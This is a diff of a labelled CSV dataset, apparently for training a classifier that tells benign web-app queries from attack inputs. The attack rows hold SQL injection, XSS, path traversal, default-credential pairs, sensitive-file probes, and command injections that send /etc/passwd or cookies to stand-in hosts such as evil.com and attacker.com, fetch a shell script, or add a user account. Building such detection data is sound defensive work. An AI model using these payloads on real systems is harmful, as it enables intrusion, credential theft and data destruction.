@@ -1,751 +1,3301 @@
 text,label
-filter results by about,0
-upload image smartphones,0
-"1' UNION ALL SELECT NULL,NULL--",1
-import contacts mobile apps,0
-1'; DELETE FROM products WHERE 1=1--,1
-<img src=x:alert(1) onerror=eval(src)>,1
-import contacts report_january,0
-create new post about xml,0
-description=<embed src=javascript:alert(1)>,1
-update profile name to services,0
-name=<marquee onstart=alert(1)>,1
-sort items by user123,0
-save settings for csv,0
-1' and 1=1--,1
-<select onfocus=alert(1) autofocus>,1
-upload image json,0
-filter results by json,0
-search books about database design,0
-save settings for user123,0
-search books about data science,0
-search books about xml,0
-message=<div onmouseover=alert(1)>hover</div>,1
-message=<object data=javascript:alert(1)>,1
-delete item id data science,0
-description=<script>document.cookie</script>,1
-filter results by morning,0
-id=' AND 1=(SELECT COUNT(*) FROM users)--,1
-1' and 1=1--,1
-name=<body onload=alert('XSS')>,1
-name=<img src=x:alert(1) onerror=eval(src)>,1
-fetch product details web development,0
+specifications compare products two req1081,0
+view for product policy return req669,0
+username=admin&password=monkey,1
+store for check availability item req991,0
+"id=1 AND 1=CONVERT(int,@@version)--",1
+30 history view last for req756,0
+1; DROP TABLE users--,1
+billing for address update account req729,0
+contact refund for request support req404,0
+GET /.env HTTP/1.1,1
+jpeg upload picture req211,0
+../../../../var/www/html/config.php,1
+new with email req358,0
+%3Cscript%3Ealert(1)%3C/script%3E,1
+view terms page conditions and req537,0
+<svg onload=alert(document.domain)>,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+; cat /etc/shadow,1
+`id`,1
+and username password req1052,0
+& ipconfig,1
 "<iframe src=data:text/html,<script>alert(1)</script>>",1
-user login with username contact,0
-search query for web development,0
-create new post about pdf,0
-sync calendar invoice_2024,0
-' AND 1=(SELECT COUNT(*) FROM users)--,1
-comment=<embed src=javascript:alert(1)>,1
-message=<textarea onfocus=alert(1) autofocus>,1
-create new post about report_january,0
-import contacts user123,0
-message=<svg><script>alert(1)</script></svg>,1
-'; DROP TABLE users--,1
-filter results by machine learning,0
-search books about web development,0
-<script>window.location='http://evil.com'</script>,1
-"1' union all select null,null--",1
-'; DROP TABLE users--,1
-create new post about machine learning,0
-sync calendar contact,0
-load data from smartphones,0
-import contacts evening,0
-comment=<script>window.location='http://evil.com'</script>,1
-download file python programming,0
-search='; UPDATE users SET password='hacked'--,1
-username=' OR 'x'='x,1
-sort items by services,0
-username=1'; WAITFOR DELAY '00:00:05'--,1
-search query for machine learning,0
-description=<img src=x onerror=alert(1)>,1
-search books about weekend,0
-view page number contact,0
-load data from weekday,0
-create new post about database design,0
-message=<input onfocus=alert(1) autofocus>,1
-username=1'; WAITFOR DELAY '00:00:05'--,1
-' OR '1'='1,1
-message=javascript:alert('XSS'),1
-message=<img src='x' onerror='alert(1)'>,1
-save settings for python programming,0
-<textarea onfocus=alert(1) autofocus>,1
-description=<script>alert('XSS')</script>,1
-id='; UPDATE users SET password='hacked'--,1
-sync calendar dashboard_view,0
-view page number machine learning,0
-description=<script>alert('XSS')</script>,1
-load data from xml,0
-1' or '1'='1' /*,1
-view page number morning,0
-search=' OR 'x'='x,1
-description=<embed src=javascript:alert(1)>,1
-save settings for admin_panel,0
-download file report_january,0
-name=<img src=x:alert(1) onerror=eval(src)>,1
-description=<svg><script>alert(1)</script></svg>,1
-id=admin'#,1
-sort items by services,0
-comment=<iframe src=javascript:alert('XSS')>,1
-search='; DROP TABLE users--,1
-download file products,0
-save settings for evening,0
-load data from home,0
-search query for machine learning,0
-sync calendar machine learning,0
-filter results by services,0
-user login with username contact,0
-export report data science,0
-id=' OR SLEEP(5)--,1
-name=<div onmouseover=alert(1)>hover</div>,1
-search='; UPDATE users SET password='hacked'--,1
-share link to electronics,0
-create new post about contact,0
-delete item id pdf,0
-comment=<marquee onstart=alert(1)>,1
-message=<svg/onload=alert(1)>,1
-description=<img src=x onerror=alert(1)>,1
-search=' OR '1'='1,1
-export report home,0
-save settings for weekend,0
-get order status home,0
-search query for pdf,0
-1' UNION SELECT NULL--,1
-' or sleep(5)--,1
-<svg/onload=alert(1)>,1
-search=1' AND 1=1--,1
-description=<textarea onfocus=alert(1) autofocus>,1
-1'; DELETE FROM products WHERE 1=1--,1
-id=' OR 1=1 LIMIT 1--,1
-1' or 1=1--,1
-update profile name to products,0
-description=<svg/onload=alert(1)>,1
-message=<select onfocus=alert(1) autofocus>,1
-delete item id dashboard_view,0
-id=1' ORDER BY 10--,1
-1'; waitfor delay '00:00:05'--,1
-view page number products,0
-view page number services,0
-name=<script>alert('XSS')</script>,1
-sync calendar contact,0
-fetch product details products,0
-comment=<script>window.location='http://evil.com'</script>,1
-"comment=<iframe src=data:text/html,<script>alert(1)</script>>",1
-view page number order_12345,0
-create new post about smartphones,0
-name=<div onmouseover=alert(1)>hover</div>,1
-import contacts services,0
-search query for pdf,0
-sort items by data science,0
-'; UPDATE USERS SET PASSWORD='HACKED'--,1
-delete item id electronics,0
-import contacts services,0
-username=admin'--,1
-<svg onload=alert(1)>,1
-1' OR '1'='1' /*,1
-"search=1' UNION ALL SELECT NULL,NULL--",1
-username=' OR 1=1#,1
-"comment=<iframe src=data:text/html,<script>alert(1)</script>>",1
-"description=<iframe src=data:text/html,<script>alert(1)</script>>",1
-share link to user123,0
-upload image about,0
-get order status services,0
-search='; EXEC xp_cmdshell('dir')--,1
-id=' OR '1'='1,1
-username=admin'#,1
-description=<svg/onload=alert(1)>,1
-'; UPDATE users SET password='hacked'--,1
-share link to python programming,0
-sort items by electronics,0
-save settings for database design,0
-sort items by pdf,0
-name=<svg/onload=alert(1)>,1
-save settings for database design,0
-delete item id contact,0
-comment=<object data=javascript:alert(1)>,1
-message=javascript:alert('XSS'),1
-username=' OR username IS NOT NULL--,1
-<svg onload=alert(1)>,1
-download file database design,0
-search=1' AND 1=1--,1
-username=1'; WAITFOR DELAY '00:00:05'--,1
-username=' OR username IS NOT NULL--,1
-update profile name to laptops,0
-comment=<marquee onstart=alert(1)>,1
-1' or 1=1--,1
-upload image web development,0
-user login with username weekend,0
-update profile name to admin_panel,0
-sort items by json,0
-upload image invoice_2024,0
-'; EXEC XP_CMDSHELL('DIR')--,1
-name=<select onfocus=alert(1) autofocus>,1
-username='; EXEC xp_cmdshell('dir')--,1
-export report services,0
-update profile name to data science,0
-save settings for user123,0
-search=' OR 'x'='x,1
-comment=javascript:alert('XSS'),1
-fetch product details json,0
-create new post about csv,0
-export report invoice_2024,0
-sort items by weekday,0
-<body onload=alert('XSS')>,1
-search query for products,0
-load data from pdf,0
-sync calendar csv,0
-id=1' OR 1=1--,1
-name=javascript:alert('XSS'),1
-id='; DROP TABLE users--,1
-update profile name to user123,0
-view page number machine learning,0
-<marquee onstart=alert(1)>,1
-search query for evening,0
-download file report_january,0
-sync calendar home,0
-"1' union all select null,null--",1
-comment=<img src=x onerror=alert(1)>,1
-sync calendar order_12345,0
-description=<select onfocus=alert(1) autofocus>,1
-upload image about,0
-search query for json,0
-upload image web development,0
-delete item id mobile apps,0
-' OR 1=1#,1
-name=<script>window.location='http://evil.com'</script>,1
-name=<input onfocus=alert(1) autofocus>,1
-export report pdf,0
-load data from evening,0
-import contacts admin_panel,0
-description=<select onfocus=alert(1) autofocus>,1
-upload image morning,0
-save settings for xlsx,0
-'; UPDATE USERS SET PASSWORD='HACKED'--,1
-filter results by user123,0
-sort items by report_january,0
-message=<img src='x' onerror='alert(1)'>,1
-<img src='x' onerror='alert(1)'>,1
-name=<svg/onload=alert(1)>,1
-view page number machine learning,0
-username='; UPDATE users SET password='hacked'--,1
-save settings for json,0
-upload image weekday,0
-download file pdf,0
-ADMIN' OR '1'='1,1
-1' AND EXISTS(SELECT * FROM USERS)--,1
-' OR SLEEP(5)--,1
-description=<body onload=alert('XSS')>,1
-search='; EXEC xp_cmdshell('dir')--,1
-create new post about report_january,0
-search books about xlsx,0
-message=<svg/onload=alert(1)>,1
-create new post about pdf,0
-"id=1' UNION SELECT 1,2,3--",1
-"1' UNION ALL SELECT NULL,NULL--",1
-<object data=javascript:alert(1)>,1
-create new post about python programming,0
-fetch product details home,0
-<img src=x:alert(1) onerror=eval(src)>,1
-'; EXEC XP_CMDSHELL('DIR')--,1
-edit comment text evening,0
-search books about xml,0
-edit comment text admin_panel,0
-ADMIN' OR '1'='1,1
-id=1' OR '1'='1' /*,1
-'; DROP TABLE users--,1
-filter results by smartphones,0
-'; DROP TABLE USERS--,1
-export report mobile apps,0
-message=<embed src=javascript:alert(1)>,1
-ADMIN'--,1
-edit comment text dashboard_view,0
-export report database design,0
-<input onfocus=alert(1) autofocus>,1
-comment=<script>alert('XSS')</script>,1
-search books about xml,0
-import contacts order_12345,0
-username=' OR 'a'='a,1
-message=<script>alert('XSS')</script>,1
-1'; WAITFOR DELAY '00:00:05'--,1
-'; UPDATE USERS SET PASSWORD='HACKED'--,1
-save settings for smartphones,0
-username='; UPDATE users SET password='hacked'--,1
-message=<svg/onload=alert(1)>,1
-export report services,0
-import contacts web development,0
-search=1'; DELETE FROM products WHERE 1=1--,1
-' OR SLEEP(5)--,1
-message=<script>document.cookie</script>,1
-download file data science,0
-<iframe src=javascript:alert('XSS')>,1
-download file morning,0
-name=<svg/onload=alert(1)>,1
-search=1'; WAITFOR DELAY '00:00:05'--,1
-name=<marquee onstart=alert(1)>,1
-message=<textarea onfocus=alert(1) autofocus>,1
-description=<script>document.cookie</script>,1
-save settings for services,0
-update profile name to laptops,0
-message=<select onfocus=alert(1) autofocus>,1
-name=<img src=x:alert(1) onerror=eval(src)>,1
-' OR 'x'='x,1
-comment=<img src='x' onerror='alert(1)'>,1
-search=1' AND 1=1--,1
-view page number data science,0
-upload image morning,0
-export report web development,0
-export report json,0
-' OR 1=1#,1
-username=1' ORDER BY 10--,1
-search books about xml,0
-"1' UNION SELECT 1,2,3--",1
-<script>alert('XSS')</script>,1
-comment=<img src=x:alert(1) onerror=eval(src)>,1
-message=<select onfocus=alert(1) autofocus>,1
-"1' UNION SELECT 1,2,3--",1
-get order status evening,0
-description=<input onfocus=alert(1) autofocus>,1
-view page number laptops,0
-description=<img src=x onerror=alert(1)>,1
-message=<script>alert('XSS')</script>,1
-id=' OR username IS NOT NULL--,1
-get order status invoice_2024,0
-search books about database design,0
-message=<svg><script>alert(1)</script></svg>,1
-comment=<select onfocus=alert(1) autofocus>,1
-view page number csv,0
-<iframe src=javascript:alert('XSS')>,1
-sync calendar electronics,0
-message=<script>window.location='http://evil.com'</script>,1
-"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
-share link to xml,0
-download file home,0
-sync calendar user123,0
-"' UNION SELECT USERNAME, PASSWORD FROM USERS--",1
-"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
-sync calendar home,0
-admin' OR '1'='1,1
-create new post about services,0
-name=<script>window.location='http://evil.com'</script>,1
-description=<body onload=alert('XSS')>,1
-sync calendar database design,0
-description=<img src='x' onerror='alert(1)'>,1
-sort items by database design,0
-upload image machine learning,0
-sort items by database design,0
-update profile name to machine learning,0
-search=1' UNION SELECT NULL--,1
-sync calendar laptops,0
-name=<svg><script>alert(1)</script></svg>,1
-search query for user123,0
-1'; DELETE FROM products WHERE 1=1--,1
-id=1'; DELETE FROM products WHERE 1=1--,1
-<script>document.cookie</script>,1
-' OR 'X'='X,1
-download file morning,0
-username='; EXEC xp_cmdshell('dir')--,1
-' or 1=1#,1
-save settings for contact,0
-' or '1'='1,1
-comment=<embed src=javascript:alert(1)>,1
-comment=<object data=javascript:alert(1)>,1
-"search=1' UNION SELECT 1,2,3--",1
-admin'--,1
-delete item id laptops,0
-search=1' OR '1'='1' /*,1
-save settings for mobile apps,0
-filter results by about,0
-delete item id weekend,0
-username=' OR username IS NOT NULL--,1
-"username=1' UNION SELECT 1,2,3--",1
-description=<script>document.cookie</script>,1
-load data from web development,0
-message=<svg><script>alert(1)</script></svg>,1
-description=<embed src=javascript:alert(1)>,1
-sync calendar user123,0
-description=<select onfocus=alert(1) autofocus>,1
-'; exec xp_cmdshell('dir')--,1
-name=<embed src=javascript:alert(1)>,1
-1' and 1=1--,1
-name=<script>window.location='http://evil.com'</script>,1
-get order status report_january,0
-name=<svg><script>alert(1)</script></svg>,1
-sort items by machine learning,0
-search=1' UNION SELECT NULL--,1
-' OR USERNAME IS NOT NULL--,1
-create new post about web development,0
-1' order by 10--,1
-1' or '1'='1' /*,1
-comment=<object data=javascript:alert(1)>,1
-<script>window.location='http://evil.com'</script>,1
-username=1'; WAITFOR DELAY '00:00:05'--,1
-id=' OR '1'='1,1
-get order status invoice_2024,0
-1'; WAITFOR DELAY '00:00:05'--,1
-edit comment text order_12345,0
-1' UNION SELECT NULL--,1
+; cat /etc/shadow,1
+product item add to cart req385,0
+username=admin&password=123456,1
+file:///etc/passwd,1
+id=2 OR 1=1,1
+| uname -a,1
+email with newsletter to subscribe req277,0
+panel notification settings view req1069,0
+1'; EXEC xp_cmdshell('whoami')--,1
+GET /api/swagger.json HTTP/1.1,1
+and login username req582,0
+GET /crossdomain.xml HTTP/1.1,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+file:///etc/passwd,1
+GET /config.bak HTTP/1.1,1
+GET /server-status HTTP/1.1,1
+../../../../var/www/html/config.php,1
+<body background=javascript:alert(1)>,1
+file:///etc/passwd,1
+notification view settings panel req588,0
+tracking track number with req804,0
+checkout credit with card req331,0
+brute force attempt on login endpoint from single ip,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+password spray attack detected multiple users,1
+GET /wp-admin HTTP/1.1,1
 1' ORDER BY 10--,1
-sync calendar order_12345,0
-<script>window.location='http://evil.com'</script>,1
-search query for web development,0
-user login with username weekend,0
-message=<svg onload=alert(1)>,1
-fetch product details database design,0
-id=' OR 'x'='x,1
-search query for user123,0
-1'; WAITFOR DELAY '00:00:05'--,1
-name=<input onfocus=alert(1) autofocus>,1
-user login with username report_january,0
-get order status morning,0
-<select onfocus=alert(1) autofocus>,1
-description=<img src=x onerror=alert(1)>,1
-comment=<img src='x' onerror='alert(1)'>,1
-delete item id json,0
-edit comment text database design,0
-upload image order_12345,0
-delete item id invoice_2024,0
-user login with username contact,0
-username=1' OR '1'='1' /*,1
-id=1'; WAITFOR DELAY '00:00:05'--,1
-message=<script>document.cookie</script>,1
-comment=<script>alert('XSS')</script>,1
-comment=<script>document.cookie</script>,1
-download file xlsx,0
-name=<select onfocus=alert(1) autofocus>,1
-get order status machine learning,0
-'; update users set password='hacked'--,1
-share link to machine learning,0
-name=<input onfocus=alert(1) autofocus>,1
-name=<svg/onload=alert(1)>,1
-ADMIN'--,1
-message=<div onmouseover=alert(1)>hover</div>,1
-export report database design,0
-filter results by evening,0
-1'; delete from products where 1=1--,1
-delete item id machine learning,0
-filter results by smartphones,0
-' OR '1'='1,1
-export report laptops,0
-<img src=x onerror=alert(1)>,1
-sync calendar electronics,0
-id=1' AND 1=1--,1
-get order status csv,0
-' or username is not null--,1
-username=' OR '1'='1,1
-1' or 1=1--,1
-export report xlsx,0
-1' or 1=1--,1
-search='; UPDATE users SET password='hacked'--,1
-user login with username python programming,0
-delete item id json,0
-search query for json,0
-download file user123,0
-search query for json,0
-description=javascript:alert('XSS'),1
-get order status laptops,0
+<SCRIPT>alert('XSS')</SCRIPT>,1
+../../../../proc/self/environ,1
+as report export data csv req928,0
+username=admin&password=admin,1
+number order download for req707,0
+<body onload=alert('XSS')>,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+GET /actuator/env HTTP/1.1,1
+newest sort listing req92,0
+& ipconfig,1
+GET /backup.sql HTTP/1.1,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+for days history req136,0
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+GET /phpmyadmin HTTP/1.1,1
 1' OR 1=1--,1
-' OR '1'='1,1
-update profile name to services,0
-delete item id smartphones,0
-load data from user123,0
-upload image machine learning,0
-save settings for evening,0
-share link to morning,0
-name=<svg><script>alert(1)</script></svg>,1
-save settings for smartphones,0
-search books about machine learning,0
-edit comment text evening,0
-username=1' UNION SELECT NULL--,1
-upload image json,0
-search books about mobile apps,0
-' OR username IS NOT NULL--,1
-update profile name to machine learning,0
-sync calendar database design,0
-javascript:alert('XSS'),1
-description=<script>document.cookie</script>,1
-delete item id order_12345,0
-description=<iframe src=javascript:alert('XSS')>,1
-download file weekend,0
-load data from weekday,0
-' AND 1=(SELECT COUNT(*) FROM USERS)--,1
-username=admin' OR '1'='1,1
-id=' OR username IS NOT NULL--,1
-"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
-username=1' AND 1=1--,1
-user login with username order_12345,0
-delete item id smartphones,0
-name=<svg/onload=alert(1)>,1
-description=<select onfocus=alert(1) autofocus>,1
-"username=1' UNION SELECT 1,2,3--",1
-1'; WAITFOR DELAY '00:00:05'--,1
-delete item id contact,0
-export report json,0
-view page number evening,0
-name=<iframe src=javascript:alert('XSS')>,1
-fetch product details user123,0
-1'; DELETE FROM products WHERE 1=1--,1
-search query for xlsx,0
-description=<img src=x:alert(1) onerror=eval(src)>,1
-search=' AND 1=(SELECT COUNT(*) FROM users)--,1
-message=javascript:alert('XSS'),1
-name=<script>window.location='http://evil.com'</script>,1
-view page number admin_panel,0
-name=<img src='x' onerror='alert(1)'>,1
-save settings for services,0
-fetch product details json,0
-message=<script>document.cookie</script>,1
-<svg><script>alert(1)</script></svg>,1
-user login with username database design,0
-description=<svg onload=alert(1)>,1
-' OR SLEEP(5)--,1
-edit comment text xlsx,0
-1'; WAITFOR DELAY '00:00:05'--,1
-search='; UPDATE users SET password='hacked'--,1
-search=admin'#,1
-export report user123,0
-admin'#,1
-name=<iframe src=javascript:alert('XSS')>,1
-'; UPDATE USERS SET PASSWORD='HACKED'--,1
-update profile name to evening,0
-fetch product details pdf,0
-message=<textarea onfocus=alert(1) autofocus>,1
-username='; UPDATE users SET password='hacked'--,1
-1'; waitfor delay '00:00:05'--,1
-import contacts morning,0
-search=' AND 1=(SELECT COUNT(*) FROM users)--,1
-name=<svg><script>alert(1)</script></svg>,1
-filter results by laptops,0
-"1' UNION ALL SELECT NULL,NULL--",1
-sync calendar json,0
-1' and exists(select * from users)--,1
-save settings for machine learning,0
-<img src='x' onerror='alert(1)'>,1
-id=' OR 1=1 LIMIT 1--,1
-comment=<svg><script>alert(1)</script></svg>,1
-download file services,0
-username=1' OR 1=1--,1
-'; DROP TABLE USERS--,1
-username=' OR username IS NOT NULL--,1
-1' AND 1=1--,1
-update profile name to morning,0
-id=' AND 1=(SELECT COUNT(*) FROM users)--,1
-<script>document.cookie</script>,1
-view page number web development,0
-search=' OR 'x'='x,1
-comment=<script>document.cookie</script>,1
-message=<img src=x onerror=alert(1)>,1
-<img src=x:alert(1) onerror=eval(src)>,1
-username='; UPDATE users SET password='hacked'--,1
-user login with username laptops,0
-search=1' OR 1=1--,1
-fetch product details smartphones,0
-delete item id admin_panel,0
-delete item id machine learning,0
-sort items by electronics,0
-"search=' UNION SELECT username, password FROM users--",1
-comment=<img src='x' onerror='alert(1)'>,1
-username=' OR 1=1#,1
-'; UPDATE USERS SET PASSWORD='HACKED'--,1
-get order status home,0
-"username=1' UNION ALL SELECT NULL,NULL--",1
-comment=<input onfocus=alert(1) autofocus>,1
-1'; delete from products where 1=1--,1
-update profile name to report_january,0
-search=' AND 1=(SELECT COUNT(*) FROM users)--,1
-"id=1' UNION ALL SELECT NULL,NULL--",1
-share link to xml,0
-1' and exists(select * from users)--,1
-filter results by pdf,0
-id=' OR 1=1#,1
-username=1' UNION SELECT NULL--,1
-comment=<script>window.location='http://evil.com'</script>,1
-filter results by machine learning,0
-save settings for csv,0
-sort items by json,0
-1' order by 10--,1
-save settings for morning,0
-<embed src=javascript:alert(1)>,1
-id=1' AND EXISTS(SELECT * FROM users)--,1
-fetch product details morning,0
-edit comment text weekday,0
-user login with username data science,0
-edit comment text web development,0
-get order status morning,0
-fetch product details csv,0
-<marquee onstart=alert(1)>,1
-view page number machine learning,0
-upload image report_january,0
-get order status home,0
-delete item id dashboard_view,0
-comment=<iframe src=javascript:alert('XSS')>,1
-"message=<iframe src=data:text/html,<script>alert(1)</script>>",1
-filter results by database design,0
-import contacts services,0
-import contacts invoice_2024,0
-upload image evening,0
-"id=1' UNION SELECT 1,2,3--",1
-comment=<svg onload=alert(1)>,1
-export report mobile apps,0
-<object data=javascript:alert(1)>,1
-id=' OR username IS NOT NULL--,1
-save settings for laptops,0
-comment=<img src=x onerror=alert(1)>,1
-delete item id data science,0
-view page number dashboard_view,0
-<object data=javascript:alert(1)>,1
-load data from evening,0
-delete item id evening,0
-view page number report_january,0
-description=javascript:alert('XSS'),1
-user login with username electronics,0
-name=<embed src=javascript:alert(1)>,1
-export report database design,0
-delete item id morning,0
-<img src='x' onerror='alert(1)'>,1
-import contacts report_january,0
-filter results by smartphones,0
-create new post about home,0
-username=1' AND EXISTS(SELECT * FROM users)--,1
-create new post about home,0
-get order status user123,0
-upload image xml,0
-comment=<script>alert('XSS')</script>,1
+link reset via req315,0
+1' OR '1'='1,1
 <textarea onfocus=alert(1) autofocus>,1
-search books about mobile apps,0
-1' or 1=1--,1
-id=admin'--,1
+on map locations req963,0
+; id,1
+../../../../etc/passwd,1
+authentication factor two enable req176,0
+username=test&password=test,1
+email password link req567,0
+| wget http://attacker.com/shell.sh,1
+username=admin&password=qwerty,1
+view policy product return for req596,0
+../../../../proc/self/environ,1
+1' GROUP BY 1--,1
+two authentication factor enable req1001,0
+GET /config.bak HTTP/1.1,1
+wishlist item later to save for req876,0
+"1 UNION SELECT @@version,NULL--",1
+1' ORDER BY 10--,1
+reset email password via req965,0
+GET /console HTTP/1.1,1
+GET /.git/config HTTP/1.1,1
+id=2 OR 1=1,1
+username=root&password=root,1
+1; DROP TABLE users--,1
+account for billing update req576,0
+username=admin&password=abc123,1
 <script>alert('XSS')</script>,1
-search books about invoice_2024,0
-'; EXEC XP_CMDSHELL('DIR')--,1
-username=1' AND EXISTS(SELECT * FROM users)--,1
-name=<svg/onload=alert(1)>,1
-1'; waitfor delay '00:00:05'--,1
-' and 1=(select count(*) from users)--,1
-description=<svg onload=alert(1)>,1
-name=<div onmouseover=alert(1)>hover</div>,1
-message=<select onfocus=alert(1) autofocus>,1
-name=<script>window.location='http://evil.com'</script>,1
-' or '1'='1,1
-download file user123,0
-import contacts order_12345,0
-username=' AND 1=(SELECT COUNT(*) FROM users)--,1
-view page number invoice_2024,0
-message=<img src=x onerror=alert(1)>,1
-message=<script>alert('XSS')</script>,1
-search books about services,0
-save settings for csv,0
-"1' UNION SELECT 1,2,3--",1
-1' and exists(select * from users)--,1
-id=admin' OR '1'='1,1
-search query for weekday,0
-view page number xml,0
-user login with username mobile apps,0
-import contacts data science,0
-comment=<input onfocus=alert(1) autofocus>,1
-upload image invoice_2024,0
-"name=<iframe src=data:text/html,<script>alert(1)</script>>",1
-search query for admin_panel,0
-message=<img src=x onerror=alert(1)>,1
-update profile name to services,0
-name=<script>alert('XSS')</script>,1
-description=<body onload=alert('XSS')>,1
-<svg/onload=alert(1)>,1
-fetch product details dashboard_view,0
-share link to home,0
-message=<div onmouseover=alert(1)>hover</div>,1
-username=' OR username IS NOT NULL--,1
-' OR 1=1#,1
-filter results by pdf,0
-description=<embed src=javascript:alert(1)>,1
-<marquee onstart=alert(1)>,1
-download file python programming,0
-create new post about laptops,0
-import contacts web development,0
-user login with username machine learning,0
-message=<script>window.location='http://evil.com'</script>,1
-share link to xlsx,0
-message=<svg onload=alert(1)>,1
-share link to weekend,0
-username=' OR '1'='1,1
-load data from xlsx,0
-search query for pdf,0
-import contacts weekday,0
-sync calendar xlsx,0
-filter results by machine learning,0
-id=' OR 1=1 LIMIT 1--,1
-name=<input onfocus=alert(1) autofocus>,1
-edit comment text smartphones,0
-search=' OR '1'='1,1
-sync calendar admin_panel,0
-"1' union select 1,2,3--",1
-save settings for products,0
-id='; UPDATE users SET password='hacked'--,1
-search=1' OR '1'='1' /*,1
-' AND 1=(SELECT COUNT(*) FROM USERS)--,1
-user login with username report_january,0
-<script>document.cookie</script>,1
-username=' AND 1=(SELECT COUNT(*) FROM users)--,1
-upload image home,0
-get order status machine learning,0
-1' or 1=1--,1
-message=<script>window.location='http://evil.com'</script>,1
-sync calendar order_12345,0
-'; DROP TABLE users--,1
-load data from order_12345,0
-search books about products,0
-search=1'; DELETE FROM products WHERE 1=1--,1
-download file morning,0
-search query for csv,0
-create new post about smartphones,0
-'; update users set password='hacked'--,1
-share link to weekend,0
-sync calendar weekend,0
-<object data=javascript:alert(1)>,1
-message=<svg/onload=alert(1)>,1
-update profile name to csv,0
-save settings for database design,0
-search=admin' OR '1'='1,1
-view page number electronics,0
-share link to xml,0
-description=<script>alert('XSS')</script>,1
-username=admin'#,1
-message=<textarea onfocus=alert(1) autofocus>,1
-export report database design,0
-1'; WAITFOR DELAY '00:00:05'--,1
-message=<svg><script>alert(1)</script></svg>,1
-comment=<svg><script>alert(1)</script></svg>,1
-import contacts invoice_2024,0
-description=<div onmouseover=alert(1)>hover</div>,1
-filter results by pdf,0
-delete item id smartphones,0
-name=<body onload=alert('XSS')>,1
-search query for electronics,0
-name=<div onmouseover=alert(1)>hover</div>,1
-search query for pdf,0
-id=' OR 'x'='x,1
-sync calendar weekday,0
-load data from home,0
-1' or 1=1--,1
-message=<marquee onstart=alert(1)>,1
-user login with username web development,0
-<embed src=javascript:alert(1)>,1
-username=' OR username IS NOT NULL--,1
-comment=<script>alert('XSS')</script>,1
-search books about contact,0
-comment=<img src=x onerror=alert(1)>,1
-share link to contact,0
-name=<img src='x' onerror='alert(1)'>,1
-upload image weekday,0
-filter results by electronics,0
-download file products,0
-comment=<select onfocus=alert(1) autofocus>,1
-delete item id evening,0
-message=<textarea onfocus=alert(1) autofocus>,1
-' or sleep(5)--,1
-' OR SLEEP(5)--,1
+coupon at checkout req101,0
+& ipconfig,1
+....//....//etc/passwd,1
+set preference to express delivery req163,0
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+& net user hacker Password1 /add,1
+brute force attempt on login endpoint from single ip,1
+; id,1
+username=admin&password=qwerty,1
+; id,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+' OR 'x'='x,1
+view section related products req808,0
+username=admin&password=admin123,1
+shipment with number tracking track req146,0
+"';alert(String.fromCharCode(88,83,83))//",1
+../../../../proc/self/environ,1
+factor enable authentication req1186,0
+login attempt failed username admin invalid credentials,1
+store on map locations view req1065,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+for request refund contact support req566,0
+username=admin&password=superman,1
+GET /.env HTTP/1.1,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+checkout with payment req691,0
+for update address billing account req998,0
+logout session from current req750,0
+articles feed get news req426,0
+GET /server-status HTTP/1.1,1
+email link reset password via req958,0
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+../../wp-config.php,1
+<select onfocus=alert(1) autofocus>,1
+<script>alert('XSS')</script>,1
+../../wp-config.php,1
+....//....//etc/passwd,1
+admin'--,1
+<textarea onfocus=alert(1) autofocus>,1
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+username=test&password=test,1
+GET /.git/config HTTP/1.1,1
+1' ORDER BY 10--,1
+& ipconfig,1
+"; python -c 'import socket,subprocess'",1
+file:///etc/passwd,1
+number with tracking req1157,0
+from current session req1135,0
+<details open ontoggle=alert(1)>,1
+username=admin&password=monkey,1
+last 30 view order for req172,0
+view section related products req82,0
+../../../../etc/passwd,1
+"1 UNION SELECT @@version,NULL--",1
+<body background=javascript:alert(1)>,1
+jpeg upload format picture profile req792,0
+$(whoami),1
+1' GROUP BY 1--,1
+GET /.git/config HTTP/1.1,1
+browse phones category mobile req519,0
+..\..\..\windows\system32\drivers\etc\hosts,1
+for return policy view product req1107,0
+page conditions and view terms req562,0
+<details open ontoggle=alert(1)>,1
+news get articles feed latest req634,0
+username=admin&password=qwerty,1
+<ScRiPt>alert(1)</ScRiPt>,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+GET /web.config HTTP/1.1,1
+5 product review req695,0
+%3Cscript%3Ealert(1)%3C/script%3E,1
+username=admin&password=abc123,1
+<svg onload=alert(document.domain)>,1
+GET /web.config HTTP/1.1,1
+range by results req194,0
+username=admin&password=monkey,1
+| wget http://attacker.com/shell.sh,1
+1' OR '1'='1,1
+1'; DELETE FROM orders WHERE 1=1--,1
+browse mobile category phones req806,0
+"1 UNION SELECT @@version,NULL--",1
+username=admin&password=batman,1
+"1 UNION SELECT username,password FROM users--",1
+<svg><script>alert(1)</script></svg>,1
+username=admin'/*,1
+username=admin&password=admin123,1
+username=admin'/*,1
+specifications products compare two req724,0
 1' OR 1=1--,1
-fetch product details pdf,0
-load data from mobile apps,0
-comment=<textarea onfocus=alert(1) autofocus>,1
-filter results by web development,0
-1' OR '1'='1' /*,1
+range to 500 price 100 by req1117,0
+password and login username with req1059,0
+checkout payment credit card with req1153,0
+factor enable two authentication req166,0
+email with account register new req753,0
+1'; DELETE FROM orders WHERE 1=1--,1
+tracking with track number req77,0
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+for later item save wishlist to req397,0
+history for days req545,0
+rate stars 5 req403,0
+<object data=javascript:alert(1)>,1
+& ipconfig,1
+' OR 1=1#,1
+<video src=1 onerror=alert(1)>,1
+admin' AND 1=1--,1
